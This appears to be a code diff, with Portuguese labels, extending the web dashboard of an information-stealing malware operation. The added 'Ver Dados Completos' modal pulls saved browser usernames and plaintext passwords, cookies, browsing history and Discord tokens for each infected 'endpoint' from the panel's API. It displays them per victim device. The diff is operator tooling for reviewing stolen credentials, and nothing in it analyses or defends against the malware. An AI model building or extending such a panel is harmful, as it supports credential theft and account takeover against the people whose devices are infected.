@@ -334,6 +334,54 @@
         ::-webkit-scrollbar-thumb:hover {
             background: #666666;
         }
+        #endpointsList {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+        }
+        .modal {
+            display: none; 
+            position: fixed; 
+            z-index: 1000; 
+            left: 0; top: 0; width: 100%; height: 100%; 
+            overflow: auto; 
+            background-color: rgba(0,0,0,0.8);
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background-color: #0a0a0a;
+            margin: 5% auto; 
+            padding: 30px;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            width: 90%;
+            max-width: 1000px;
+            color: #fff;
+            animation: fadein 0.3s;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .close:hover { color: #fff; }
+        .data-section {
+            margin-top: 25px;
+            padding: 15px;
+            background: #111;
+            border-radius: 8px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .data-section h3 {
+            margin-bottom: 15px;
+            color: #a855f7;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            padding-bottom: 10px;
+            font-size: 1.1em;
+            letter-spacing: 1px;
+        }
     </style>
 </head>
 <body>
@@ -398,6 +446,17 @@
                 <div id="screenContent">
                     <div class="empty">Selecione um endpoint para visualizar</div>
                 </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal Dados Completos -->
+    <div id="dataModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="document.getElementById('dataModal').style.display='none'">&times;</span>
+            <h2 id="modalTitle" style="font-weight:300; letter-spacing:1px; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:15px">Dados Extraídos</h2>
+            <div id="modalData">
+                <div class="empty">Carregando...</div>
             </div>
         </div>
     </div>
@@ -483,13 +542,64 @@
                                 <span class="info-value">${e.last_seen}</span>
                             </div>
                         </div>
-                        <button class="btn-ver-dados" onclick="showTab('logs'); document.getElementById('endpointSelect').value='${e.id}'; loadScreen();">📊 Ver Dados</button>
+                        <button class="btn-ver-dados" onclick="showDeviceData('${e.id}')">📊 Ver Dados Completos</button>
                     </div>
                     `;
                 }).join('');
                 
                 select.innerHTML = selectHtml;
             } catch(e) {}
+        }
+        
+        async function showDeviceData(id) {
+            const modal = document.getElementById('dataModal');
+            const dataDiv = document.getElementById('modalData');
+            document.getElementById('modalTitle').textContent = 'Dados do Dispositivo: ' + id;
+            dataDiv.innerHTML = '<div class="empty">Buscando requisições do webhook...</div>';
+            modal.style.display = 'block';
+
+            try {
+                const keys = [
+                    {url: '/api/passwords_data', title: 'Senhas', parser: d => `[${d.browser || 'Browser'}] ${d.url || d.target} | <b>User:</b> ${d.username || 'N/A'} | <b>Pass:</b> <span style="color:#a855f7">${d.password}</span>`},
+                    {url: '/api/cookies_data', title: 'Cookies Ativos', parser: d => `[${d.browser || 'Browser'}] ${d.host} | ${d.name}`},
+                    {url: '/api/history_data', title: 'Histórico de Navegação', parser: d => `[${d.browser || 'Browser'}] <a href="${d.url}" target="_blank" style="color:#fff">${d.title || d.url}</a> (${d.visit_count} visitas)`},
+                ];
+
+                let html = '';
+                
+                for(const k of keys) {
+                    const res = await fetch(k.url);
+                    if(res.ok) {
+                        const items = await res.json();
+                        const myItems = items.filter(x => x.endpoint_id === id);
+                        html += `
+                        <div class="data-section">
+                            <h3>${k.title} <span style="font-size:0.7em; color:#666">(${myItems.length})</span></h3>
+                            <div style="font-family: 'Inter', monospace; font-size: 0.85em; color: #ccc; max-height: 250px; overflow-y: auto;">
+                                ${myItems.map(d => '<div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">' + k.parser(d) + '</div>').join('') || '<div style="color:#666; font-style:italic">Nenhum dado recebido do client ainda.</div>'}
+                            </div>
+                        </div>`;
+                    }
+                }
+                
+                // Fetch metrics/tokens specific
+                const resM = await fetch('/api/metrics');
+                if(resM.ok) {
+                    const metrics = await resM.json();
+                    const myMetrics = metrics.filter(x => x.endpoint_id === id);
+                    html += `
+                    <div class="data-section">
+                        <h3>Tokens do Discord <span style="font-size:0.7em; color:#666">(${myMetrics.length})</span></h3>
+                        <div style="font-family: monospace; font-size: 0.85em; color: #fff;">
+                            ${myMetrics.map(m => '<div style="padding:4px 0; border-bottom:1px dotted rgba(255,255,255,0.05)">' + m.token + ' <span style="color:#666">(' + m.source + ')</span></div>').join('') || '<div style="color:#666; font-style:italic">Nenhum token encontrado.</div>'}
+                        </div>
+                    </div>`;
+                }
+
+                dataDiv.innerHTML = html;
+            } catch(e) {
+                dataDiv.innerHTML = '<div class="empty" style="color:#ff4444">Erro ao carregar dados remotos do Banco. Verifique se a aplicação está online.</div>';
+            }
         }
         
         async function loadLogs() {
